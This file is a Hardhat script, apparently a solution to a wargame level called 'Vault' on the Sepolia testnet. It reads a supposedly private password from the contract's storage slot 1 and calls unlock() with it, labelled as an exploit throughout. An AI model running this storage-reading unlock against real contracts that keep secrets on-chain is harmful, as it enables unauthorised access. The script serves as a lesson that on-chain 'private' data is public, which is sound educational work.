import { ethers } from "hardhat";

/**
 * Reads the private password from the Vault contract and uses it to unlock the vault
 * 
 * Usage: 
 * npx hardhat run scripts/level-08-vault/read-vault-password.ts --network sepolia
 * CONTRACT_ADDRESS=0xYourAddress npx hardhat run scripts/level-08-vault/read-vault-password.ts --network sepolia
 */
async function main() {
  // Get contract address from environment variable or use default
  const defaultAddress = "0xD404840fEB422d46BD63Cf2Cd748A488e78Ec390"; // Replace with your actual default address
  const contractAddress = process.env.CONTRACT_ADDRESS || defaultAddress;
  
  console.log(`Using Vault contract address: ${contractAddress}`);
  
  // Define a minimal ABI for the Vault contract
  const vaultABI = [
    "function locked() view returns (bool)",
    "function unlock(bytes32 _password) public"
  ];
  
  // Create a contract instance using the minimal ABI
  const vaultContract = new ethers.Contract(contractAddress, vaultABI, ethers.provider);
  
  const [deployer] = await ethers.getSigners();
  console.log(`Attacker address: ${deployer.address}`);

  try {
    // Check if the vault is initially locked
    console.log("Checking if vault is locked...");
    const isLocked = await vaultContract.locked();
    console.log(`Vault is locked: ${isLocked}`);
    
    if (!isLocked) {
      console.log("Vault is already unlocked! No need to proceed further.");
      return;
    }
    
    // Read the password from storage
    // In Solidity, storage slots are assigned in the order variables are declared
    // locked is at slot 0, password is at slot 1
    console.log("Reading password from storage...");
    const password = await ethers.provider.getStorage(contractAddress, 1);
    console.log(`Retrieved password from storage: ${password}`);
    // Convert bytes32 to string using ethers v6 methods
    try {
      // Try using ethers.toUtf8String for ethers v6
      console.log(`password in readable form: ${ethers.toUtf8String(password)}`);
    } catch (error) {
      // Fallback to a manual conversion
      console.log(`password in readable form: ${Buffer.from(password.slice(2), 'hex').toString().replace(/\u0000/g, '')}`);
    }
    
    // Unlock the vault using the retrieved password
    console.log("Unlocking the vault...");
    const tx = await vaultContract.connect(deployer).getFunction("unlock")(password);
    
    // Wait for the transaction to be mined
    console.log("Waiting for unlock transaction to be mined...");
    const receipt = await tx.wait();
    
    // Check if the vault is now unlocked
    console.log("Checking if vault is now unlocked...");
    const isStillLocked = await vaultContract.locked();
    console.log(`Vault is locked: ${isStillLocked}`);
    
    // Report success or failure
    if (!isStillLocked) {
      console.log("\nExploit successful! The vault has been unlocked.");
    } else {
      console.log("\nExploit failed. The vault is still locked.");
    }
    
    // Make sure receipt is not null before accessing its properties
    if (receipt) {
      console.log(`\nTransaction details:`);
      console.log(`Hash: ${receipt.hash}`);
      console.log(`Gas used: ${receipt.gasUsed.toString()}`);
      console.log(`Block number: ${receipt.blockNumber}`);
    }
  } catch (error) {
    console.error("\nError executing exploit:", error);
    process.exitCode = 1;
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
